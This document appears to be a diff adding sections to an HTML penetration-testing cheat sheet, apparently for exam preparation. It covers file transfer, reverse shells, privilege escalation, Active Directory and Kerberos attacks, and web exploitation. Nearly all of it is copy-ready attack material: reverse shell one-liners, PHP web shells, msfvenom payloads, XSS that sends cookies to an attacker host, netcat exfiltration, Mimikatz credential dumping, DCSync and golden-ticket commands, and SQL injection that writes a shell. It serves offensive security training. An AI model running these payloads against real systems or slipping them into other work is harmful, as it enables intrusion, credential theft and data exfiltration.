+      <h2>IPMI (623 UDP)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nmap -sU -p 623 --script ipmi-version &lt;IP&gt;
+# Metasploit: use auxiliary/scanner/ipmi/ipmi_dumphashes
+# Crack: hashcat -m 7300 hashes.txt rockyou.txt</code><button class="copy-btn">COPY</button></pre></div>
+      <table><tr><th>Device</th><th>Default Creds</th></tr>
+        <tr><td>Dell iDRAC</td><td>root / calvin</td></tr>
+        <tr><td>Supermicro</td><td>ADMIN / ADMIN</td></tr>
+        <tr><td>HP iLO</td><td>Administrator / (random)</td></tr>
+      </table>
+    </div>
+
+    <!-- FILE TRANSFERS -->
+    <div class="section" id="s-filetransfer">
+      <h1>File Transfers</h1>
+      <h2>Linux → Target</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>python3 -m http.server 8080
+wget http://&lt;attacker_IP&gt;:8080/file.sh
+curl -o file.sh http://&lt;attacker_IP&gt;:8080/file.sh
+impacket-smbserver share . -smb2support   # Windows: copy \\&lt;IP&gt;\share\file.exe
+base64 -w 0 file.exe > file.b64           # Encode
+echo '&lt;b64&gt;' | base64 -d > file.exe       # Decode</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Windows Download (PowerShell)</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>(New-Object Net.WebClient).DownloadFile('http://&lt;IP&gt;/file.exe','C:\Temp\file.exe')
+IEX (New-Object Net.WebClient).DownloadString('http://&lt;IP&gt;/script.ps1')
+Invoke-WebRequest -Uri http://&lt;IP&gt;/file.exe -OutFile C:\Temp\file.exe
+certutil.exe -urlcache -split -f http://&lt;IP&gt;/file.exe C:\Temp\file.exe
+bitsadmin /transfer job /download /priority normal http://&lt;IP&gt;/file.exe C:\Temp\file.exe</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Exfiltration</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nc -lvnp 4444 > file.txt          # Attacker receives
+nc &lt;attacker_IP&gt; 4444 &lt; file.txt  # Victim sends
+scp user@&lt;victim&gt;:/etc/passwd ./</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- SHELLS -->
+    <div class="section" id="s-shells">
+      <h1>Shells & Payloads</h1>
+      <h2>Listeners</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nc -lvnp 4444
+rlwrap nc -lvnp 4444   # Better shell</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Reverse Shell One-Liners</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Bash
+bash -i >& /dev/tcp/&lt;IP&gt;/4444 0>&1
+
+# Python
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;IP&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP
+php -r '$sock=fsockopen("&lt;IP&gt;",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'
+
+# nc without -e
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;IP&gt; 4444>/tmp/f</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Web Shells</h2>
+      <div class="code-wrap"><div class="code-label php">PHP</div><pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passthru($_REQUEST['cmd']); ?&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>msfvenom</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f elf -o shell.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o met.exe
+msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=4444 -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f war -o shell.war</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Shell Upgrade (Linux TTY)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+stty rows 38 columns 159</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- METASPLOIT -->
+    <div class="section" id="s-metasploit">
+      <h1>Metasploit</h1>
+      <h2>Core Commands</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>msfconsole -q
+workspace -a exam; workspace exam
+search &lt;term&gt;; use &lt;module&gt;
+show options; show payloads
+set &lt;option&gt; &lt;value&gt;; setg LHOST &lt;IP&gt;
+run / exploit
+sessions; sessions -i &lt;id&gt;; sessions -u &lt;id&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Multi/Handler</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;IP&gt;; set LPORT 4444
+set ExitOnSession false
+run -j</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Meterpreter</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>sysinfo; getuid; getpid; ps
+migrate &lt;pid&gt;
+hashdump
+shell; execute -f cmd.exe -i -H
+upload /local/file C:\remote\
+download C:\file /local/
+portfwd add -l 3389 -r &lt;target&gt; -p 3389
+run post/multi/recon/local_exploit_suggester
+run auxiliary/server/socks_proxy SRVPORT=1080 VERSION=5
+run autoroute -s &lt;subnet&gt;/24
+getsystem</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Common Modules</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>exploit/windows/smb/ms17_010_eternalblue
+exploit/windows/smb/psexec
+post/windows/gather/hashdump
+post/linux/gather/hashdump
+auxiliary/scanner/ipmi/ipmi_dumphashes
+auxiliary/scanner/smb/smb_ms17_010
+auxiliary/scanner/ssh/ssh_login</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- LINUX PRIVESC -->
+    <div class="section" id="s-linux-privesc">
+      <h1>Linux Privilege Escalation</h1>
+      <h2>Enumeration Tools</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>./linpeas.sh | tee linpeas.txt
+./lse.sh -l 2
+./linux-exploit-suggester.sh
+./pspy64   # Watch processes without root</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>SUID Binaries</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>find / -perm -4000 -type f 2>/dev/null
+# Check each at: https://gtfobins.github.io</code><button class="copy-btn">COPY</button></pre></div>
+      <table>
+        <tr><th>Binary</th><th>Exploit</th></tr>
+        <tr><td>bash</td><td><code>bash -p</code></td></tr>
+        <tr><td>vim</td><td><code>:!bash</code></td></tr>
+        <tr><td>python</td><td><code>python -c 'import os; os.execl("/bin/sh","sh","-p")'</code></td></tr>
+        <tr><td>find</td><td><code>find . -exec /bin/sh -p \; -quit</code></td></tr>
+        <tr><td>env</td><td><code>env /bin/sh -p</code></td></tr>
+        <tr><td>awk</td><td><code>awk 'BEGIN {system("/bin/sh")}'</code></td></tr>
+        <tr><td>nmap (old)</td><td><code>nmap --interactive</code> → <code>!sh</code></td></tr>
+        <tr><td>more/less/man</td><td><code>!/bin/sh</code></td></tr>
+      </table>
+      <h2>Sudo Abuse</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>sudo -l
+sudo vim -c ':!/bin/bash'
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo find . -exec /bin/bash \; -quit
+sudo python3 -c 'import os; os.system("/bin/bash")'
+# CVE-2019-14287: sudo -u#-1 /bin/bash
+# CVE-2021-3156: sudoedit -s '\' $(python3 -c 'print("A"*1000)')</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Cron Jobs</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>cat /etc/crontab; ls -la /etc/cron.*; crontab -l
+./pspy64   # Watch for cron execution
+
+# Writable cron script
+echo "chmod +s /bin/bash" >> /path/to/cron_script.sh
+# Wait, then: bash -p
+
+# Wildcard injection (tar with *)
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=bash shell.sh"
+echo "bash -i >& /dev/tcp/&lt;IP&gt;/4444 0>&1" > shell.sh</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Other Techniques</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Writable /etc/passwd
+openssl passwd -1 hacker
+echo 'hacker:$hash:0:0::/root:/bin/bash' >> /etc/passwd; su hacker
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Kernel exploits
+uname -a; ./linux-exploit-suggester.sh
+# PwnKit CVE-2021-4034 / DirtyCow CVE-2016-5195 / Dirty Pipe CVE-2022-0847</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Password Hunting</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+grep -r "password" /var/www/ 2>/dev/null
+cat ~/.bash_history
+find / -name "id_rsa" 2>/dev/null</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- WINDOWS PRIVESC -->
+    <div class="section" id="s-win-privesc">
+      <h1>Windows Privilege Escalation</h1>
+      <h2>Enumeration Tools</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>.\winPEASx64.exe
+.\PowerUp.ps1; Invoke-AllChecks
+.\Seatbelt.exe -group=all
+run post/multi/recon/local_exploit_suggester</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Basic Enum</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>whoami /priv; whoami /groups
+systeminfo
+net user; net localgroup administrators
+netstat -ano; tasklist /svc
+wmic service get name,displayname,pathname,startmode</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Token Impersonation (Potato Attacks)</h2>
+      <div class="alert yellow">Check for SeImpersonatePrivilege first with: whoami /priv</div>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code># PrintSpoofer (Win10, Server 2016/2019)
+.\PrintSpoofer64.exe -i -c cmd
+
+# GodPotato (Universal — Win 2012-2022, Win8-11)
+.\GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe &lt;IP&gt; 4444"
+
+# JuicyPotato (older — Server 2008, Win7)
+.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c nc.exe &lt;IP&gt; 4444 -e cmd" -t *</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Unquoted Service Paths</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o "Program.exe"
+sc stop &lt;service&gt;; sc start &lt;service&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>AlwaysInstallElevated</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both = 1:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f msi -o shell.msi
+msiexec /quiet /qn /i shell.msi</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Credential Hunting</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>findstr /si password *.txt *.xml *.ini *.config
+reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg save HKLM\SAM sam.bak; reg save HKLM\SYSTEM sys.bak
+impacket-secretsdump -sam sam.bak -system sys.bak LOCAL</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- AD ENUM -->
+    <div class="section" id="s-ad-enum">
+      <h1>AD Enumeration</h1>
+      <h2>Immediate First Steps</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>net user /domain; net group "Domain Admins" /domain
+bloodhound-python -u user -p pass -d domain.com -ns &lt;DC_IP&gt; -c all --zip
+crackmapexec smb &lt;DC_IP&gt; -u user -p pass --users --groups --computers --pass-pol</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>PowerView</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>Import-Module .\PowerView.ps1
+Get-Domain; Get-DomainController
+(Get-DomainPolicy)."SystemAccess"    # CHECK LOCKOUT THRESHOLD!
+Get-DomainUser -Properties samaccountname,description,memberof,admincount
+Get-DomainUser -SPN                  # Kerberoastable
+Get-DomainGroupMember "Domain Admins" -Recurse
+Get-DomainComputer -Properties dnshostname,operatingsystem
+Find-InterestingDomainAcl -ResolveGUIDs
+Get-DomainTrust</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>BloodHound Key Queries</h2>
+      <ul>
+        <li>Shortest path to Domain Admins</li>
+        <li>Find Kerberoastable / AS-REP Roastable users</li>
+        <li>Find principals with DCSync rights</li>
+        <li>Computers where Domain Users are local admins</li>
+        <li>Find paths from owned principals</li>
+      </ul>
+      <h2>From Linux</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>ldapsearch -h &lt;DC_IP&gt; -x -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName
+impacket-GetADUsers -all domain.com/user:pass -dc-ip &lt;DC_IP&gt;
+rpcclient -U "user%pass" &lt;DC_IP&gt; -c "enumdomusers"
+ldapdomaindump &lt;DC_IP&gt; -u 'domain\user' -p 'pass'</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Dangerous ACL Rights</h2>
+      <table>
+        <tr><th>Right</th><th>What You Can Do</th></tr>
+        <tr><td>GenericAll</td><td>Change password, add to group</td></tr>
+        <tr><td>GenericWrite</td><td>Modify attributes (SPN, scriptPath)</td></tr>
+        <tr><td>WriteDACL</td><td>Grant yourself more rights</td></tr>
+        <tr><td>WriteOwner</td><td>Change object owner</td></tr>
+        <tr><td>ForceChangePassword</td><td>Change user's password</td></tr>
+        <tr><td>AllExtendedRights</td><td>ForceChangePassword, etc.</td></tr>
+      </table>
+    </div>
+
+    <!-- AD ATTACKS -->
+    <div class="section" id="s-ad-attacks">
+      <h1>AD Attacks</h1>
+      <div class="alert red">⚠ Always check lockout policy BEFORE password spraying!</div>
+      <h2>Password Spraying</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>crackmapexec smb &lt;DC_IP&gt; -u user -p pass --pass-pol   # Get lockout policy FIRST
+crackmapexec smb &lt;DC_IP&gt; -u users.txt -p 'Password1' --continue-on-success
+./kerbrute passwordspray -d domain.com --dc &lt;DC_IP&gt; users.txt 'Password123!'</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>AS-REP Roasting</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip &lt;DC_IP&gt;
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
+hashcat -m 18200 asrep.hashes rockyou.txt</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Kerberoasting</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>impacket-GetUserSPNs domain.com/user:pass -dc-ip &lt;DC_IP&gt; -request -outputfile kerb.hashes
+.\Rubeus.exe kerberoast /outfile:kerb.hashes /nowrap
+hashcat -m 13100 kerb.hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Pass-the-Hash</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>impacket-psexec administrator@&lt;IP&gt; -hashes :&lt;NTLM&gt;
+impacket-wmiexec domain/administrator@&lt;IP&gt; -hashes :&lt;NTLM&gt;
+evil-winrm -i &lt;IP&gt; -u administrator -H &lt;NTLM&gt;
+crackmapexec smb &lt;IP_range&gt;/24 -u administrator -H &lt;NTLM&gt; --local-auth</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>LLMNR Poisoning</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>sudo responder -I eth0 -dwPv
+hashcat -m 5600 hashes.txt rockyou.txt
+
+# Relay (disable SMB+HTTP in Responder.conf first)
+sudo responder -I eth0 -wd
+impacket-ntlmrelayx -tf targets.txt -smb2support</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>DCSync</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>impacket-secretsdump domain/user:pass@&lt;DC_IP&gt;
+impacket-secretsdump domain/user:pass@&lt;DC_IP&gt; -just-dc-ntlm
+
+# Mimikatz
+lsadump::dcsync /domain:domain.com /user:krbtgt
+lsadump::dcsync /domain:domain.com /all /csv</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>ACL Abuse</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code># ForceChangePassword
+Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+
+# GenericWrite → SPN → Kerberoast
+Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/spn'}
+
+# GenericAll → add to group
+Add-DomainGroupMember -Identity "Domain Admins" -Members jsmith</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>ADCS (Certificate Attacks)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>certipy find -u user@domain.com -p pass -dc-ip &lt;DC_IP&gt; -vulnerable
+# ESC1
+certipy req -u user@domain.com -p pass -ca CA-NAME -template VulnTemplate \
+  -upn administrator@domain.com -dc-ip &lt;DC_IP&gt;
+certipy auth -pfx administrator.pfx -dc-ip &lt;DC_IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- KERBEROS -->
+    <div class="section" id="s-kerberos">
+      <h1>Kerberos Attacks</h1>
+      <h2>Golden Ticket</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Requires krbtgt hash (DCSync)
+# Mimikatz
+kerberos::golden /user:FakeAdmin /domain:domain.com /sid:S-1-5-21-XXX /krbtgt:&lt;hash&gt; /ptt
+
+# Impacket
+impacket-ticketer -nthash &lt;krbtgt_hash&gt; -domain-sid S-1-5-21-XXX -domain domain.com FakeAdmin
+export KRB5CCNAME=FakeAdmin.ccache
+impacket-psexec domain.com/FakeAdmin@&lt;DC_IP&gt; -k -no-pass</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Silver Ticket</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Requires service account NTLM hash
+kerberos::golden /user:FakeAdmin /domain:domain.com /sid:S-1-5-21-XXX \
+  /target:server.domain.com /service:cifs /rc4:&lt;service_hash&gt; /ptt</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Pass-the-Ticket</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Mimikatz
+sekurlsa::tickets /export
+kerberos::ptt ticket.kirbi
+
+# Rubeus
+.\Rubeus.exe dump /nowrap
+.\Rubeus.exe ptt /ticket:&lt;base64&gt;
+
+# Impacket
+export KRB5CCNAME=ticket.ccache
+impacket-wmiexec -k -no-pass domain.com/user@&lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- WEB -->
+    <div class="section" id="s-web">
+      <h1>Web Attacks Overview</h1>
+      <h2>Methodology</h2>
+      <ul>
+        <li>Enumerate all technologies (Wappalyzer, whatweb, headers)</li>
+        <li>Spider/crawl — find all pages, params, forms</li>
+        <li>Check for login pages — brute force, default creds</li>
+        <li>Look for upload functionality → file upload attack</li>
+        <li>Enumerate all params → SQLi, XSS, LFI/RFI, SSTI</li>
+        <li>Check HTTP methods (PUT, DELETE, TRACE)</li>
+        <li>Test auth — JWT, cookies, IDOR</li>
+      </ul>
+      <h2>Web Enumeration</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>whatweb http://target.com
+nikto -h http://target.com
+curl -I http://target.com
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak
+ffuf -w wordlist.txt -u http://target.com/FUZZ</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- SQLI -->
+    <div class="section" id="s-sqli">
+      <h1>SQL Injection</h1>
+      <h2>Detection</h2>
+      <div class="code-wrap"><div class="code-label sql">SQL</div><pre><code>'
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1 --
+admin'--
+' AND SLEEP(5)--    # Blind SQLi test
+1; SELECT SLEEP(5)--</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>sqlmap</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D dbname --tables
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
+sqlmap -u "http://target.com/page?id=1" --os-shell
+sqlmap -r request.txt --level=5 --risk=3 --dbs</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Manual Union Injection</h2>
+      <div class="code-wrap"><div class="code-label sql">SQL</div><pre><code>-- Find columns
+ORDER BY 1-- ... (until error)
+UNION SELECT NULL,NULL,NULL--
+
+-- MySQL
+UNION SELECT 1,database(),user()--
+UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
+UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+
+-- Read file
+UNION SELECT 1,load_file('/etc/passwd'),3--
+
+-- Write shell
+UNION SELECT 1,"&lt;?php system($_GET['cmd']); ?&gt;",3 INTO OUTFILE '/var/www/html/shell.php'--</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- XSS -->
+    <div class="section" id="s-xss">
+      <h1>XSS</h1>
+      <h2>Detection Payloads</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+'"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+javascript:alert(1)</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Cookie Stealing</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Set up listener
+nc -lvnp 8080
+
+# XSS payload
+&lt;script&gt;document.location='http://&lt;attacker_IP&gt;:8080/?c='+document.cookie;&lt;/script&gt;
+&lt;script&gt;new Image().src="http://&lt;attacker_IP&gt;:8080/?c="+document.cookie;&lt;/script&gt;</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- LFI -->
+    <div class="section" id="s-lfi">
+      <h1>File Inclusion (LFI / RFI)</h1>
+      <h2>LFI Payloads</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>/etc/passwd
+../../../../etc/passwd
+....//....//....//etc/passwd
+%2F%2F%2F%2Fetc%2Fpasswd
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=config.php</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Log Poisoning → RCE</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Inject into User-Agent
+curl -s "http://target.com/" -A "&lt;?php system($_GET['cmd']); ?&gt;"
+
+# Include log
+http://target.com/page?file=/var/log/apache2/access.log&cmd=id
+
+# Other log paths
+/var/log/nginx/access.log
+/proc/self/environ</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>RFI</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php
+python3 -m http.server 8080
+# Trigger: http://target.com/page?file=http://&lt;attacker_IP&gt;:8080/shell.php&cmd=id</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- FILE UPLOAD -->
+    <div class="section" id="s-fileupload">
+      <h1>File Upload Attacks</h1>
+      <h2>Bypass Techniques</h2>
+      <ul>
+        <li>Change extension: <code>.php</code> → <code>.php5</code>, <code>.phtml</code>, <code>.phar</code></li>
+        <li>Double extension: <code>shell.php.jpg</code></li>
+        <li>Change MIME type in Burp: <code>Content-Type: image/jpeg</code></li>
+        <li>Add magic bytes: <code>GIF89a</code> at top of PHP file</li>
+        <li>Null byte: <code>shell.php%00.jpg</code></li>
+      </ul>
+      <h2>PHP Shells</h2>
+      <div class="code-wrap"><div class="code-label php">PHP</div><pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+GIF89a;&lt;?php system($_GET['cmd']); ?&gt;</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- SSRF XXE SSTI -->
+    <div class="section" id="s-ssrf">
+      <h1>SSRF / XXE / SSTI</h1>
+      <h2>SSRF</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>http://localhost/
+http://127.0.0.1/
+http://169.254.169.254/latest/meta-data/   # AWS
+http://[::1]/
+# Bypass filters
+http://127.1/
+http://0177.1/
+http://0x7f000001/</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>XXE</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- SSRF via XXE --&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://&lt;attacker_IP&gt;/"&gt;]&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>SSTI Detection</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>{{7*7}}    → 49 (Jinja2/Twig)
+${7*7}     → 49 (FreeMarker)
+#{7*7}     → 49 (Ruby)
+
+# Jinja2 RCE
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- LATERAL -->
+    <div class="section" id="s-lateral">
+      <h1>Lateral Movement</h1>
+      <h2>Remote Execution</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>impacket-psexec domain/user:pass@&lt;IP&gt;
+impacket-psexec domain/admin@&lt;IP&gt; -hashes :&lt;NTLM&gt;
+impacket-smbexec domain/user:pass@&lt;IP&gt;
+impacket-wmiexec domain/user:pass@&lt;IP&gt;
+crackmapexec smb &lt;IP&gt; -u user -p pass -x "whoami"
+crackmapexec smb &lt;IP&gt; -u user -p pass -X "Get-Process"</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Mimikatz</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>privilege::debug
+sekurlsa::logonpasswords   # Dump plaintext + hashes
+lsadump::sam               # SAM database
+lsadump::lsa /patch        # LSA secrets
+vault::cred                # Credential manager
+lsadump::dcsync /domain:domain.com /user:Administrator</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- POST EXPLOIT -->
+    <div class="section" id="s-postexploit">
+      <h1>Post-Exploitation</h1>
+      <h2>Linux Looting</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>find / -name "*.txt" 2>/dev/null | grep -i flag
+find / -name "id_rsa" 2>/dev/null
+cat /etc/shadow
+grep -r "password" /var/www/ 2>/dev/null
+find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Windows Looting</h2>
+      <div class="code-wrap"><div class="code-label powershell">POWERSHELL</div><pre><code>dir /s /b C:\ | findstr /i "password"
+type C:\Windows\Panther\Unattend.xml
+cmdkey /list   # Saved credentials
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- PIVOTING -->
+    <div class="section" id="s-pivoting">
+      <h1>Pivoting & Tunneling</h1>
+      <h2>SSH Tunneling</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Local forward
+ssh -L 8080:&lt;target&gt;:80 user@&lt;pivot_IP&gt;
+
+# Dynamic SOCKS proxy
+ssh -D 1080 -q -C -N user@&lt;pivot_IP&gt;
+# Then: proxychains nmap -sV -p 22,80 &lt;target&gt;
+
+# Remote forward
+ssh -R 4444:localhost:4444 user@&lt;pivot_IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>ProxyChains</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># /etc/proxychains.conf
+socks5 127.0.0.1 1080
+
+proxychains nmap -sV -p 22,80,443 &lt;target&gt;
+proxychains evil-winrm -i &lt;target&gt; -u user -p pass
+proxychains impacket-psexec domain/user:pass@&lt;target&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Chisel</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Attacker (server)
+./chisel server -p 8000 --reverse
+
+# Victim (client)
+./chisel client &lt;attacker_IP&gt;:8000 R:socks
+
+# Use proxychains with socks5 127.0.0.1 1080</code><button class="copy-btn">COPY</button></pre></div>
